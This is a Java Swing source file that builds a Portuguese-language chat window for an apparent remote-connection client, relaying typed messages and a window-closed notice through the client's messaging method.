package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:04
 */

import br.com.introcdc.connect.client.ConnectClient;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.List;

public class ChatComponents {

    public static JFrame CHAT_FRAME;
    public static JTextArea CHAT_TEXT;
    public static JTextField CHAT_FIELD;
    public static List<String> CHAT_MESSAGES = new ArrayList<>();

    public static void showChat(String message) {
        if (CHAT_FRAME == null) {
            createChatFrame();
        }

        if (message != null && !message.isEmpty()) {
            addMessage(message);
        }

        if (!CHAT_FRAME.isVisible()) {
            CHAT_FRAME.setVisible(true);
        }
    }

    public static void createChatFrame() {
        CHAT_FRAME = new JFrame("Chat");
        CHAT_FRAME.setSize(500, 400);
        CHAT_FRAME.setLocationRelativeTo(null);

        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
        } catch (Exception ignored) {
        }

        ImageIcon icon = null;
        try {
            icon = new ImageIcon(ConnectClient.class.getResource("/eye.png"));
            CHAT_FRAME.setIconImage(icon.getImage());
        } catch (Exception e) {
            System.err.println("Não foi possível carregar a imagem: " + e.getMessage());
        }

        CHAT_TEXT = new JTextArea();
        CHAT_TEXT.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(CHAT_TEXT);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

        JPanel bottomPanel = new JPanel(new BorderLayout());
        CHAT_FIELD = new JTextField();
        JButton sendButton = new JButton("Enviar");

        ActionListener sendAction = event -> {
            String msg = CHAT_FIELD.getText().trim();
            if (!msg.isEmpty()) {
                ConnectClient.msg("chat-msg:" + msg);
                addMessage("Você: " + msg);
                CHAT_FIELD.setText("");
            }
        };

        sendButton.addActionListener(sendAction);
        CHAT_FIELD.addActionListener(sendAction);
        bottomPanel.add(CHAT_FIELD, BorderLayout.CENTER);
        bottomPanel.add(sendButton, BorderLayout.EAST);

        CHAT_FRAME.setLayout(new BorderLayout());
        CHAT_FRAME.add(scrollPane, BorderLayout.CENTER);
        CHAT_FRAME.add(bottomPanel, BorderLayout.SOUTH);

        updateTextArea();
        CHAT_FRAME.setVisible(true);

        CHAT_FRAME.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent event) {
                ConnectClient.msg("chat-log:< CLIENTE FECHOU O CHAT>");
            }
        });
    }

    public static void addMessage(String message) {
        CHAT_MESSAGES.add(message);
        updateTextArea();
    }

    public static void updateTextArea() {
        CHAT_TEXT.setText("");
        for (String m : CHAT_MESSAGES) {
            CHAT_TEXT.append(m + "\n");
        }

        CHAT_TEXT.setCaretPosition(CHAT_TEXT.getDocument().getLength());
    }

}
